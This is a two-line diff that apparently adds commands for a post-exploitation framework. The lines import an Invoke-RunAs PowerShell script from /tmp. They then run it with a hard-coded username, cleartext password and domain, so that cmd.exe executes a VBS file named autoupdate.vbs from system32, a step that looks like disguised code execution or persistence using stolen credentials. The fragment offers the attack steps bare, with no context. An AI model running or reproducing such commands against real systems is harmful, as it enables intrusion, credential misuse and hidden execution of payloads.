@@ -1,0 +1,2 @@
+scriptimport /tmp/invoke-runas-cmd.ps1
+scriptcmd Invoke-RunAs -username pgustavo -password "W1n1!19" -domain shire -Cmd cmd.exe -Arguments "/c C:\windows\system32\autoupdate.vbs"
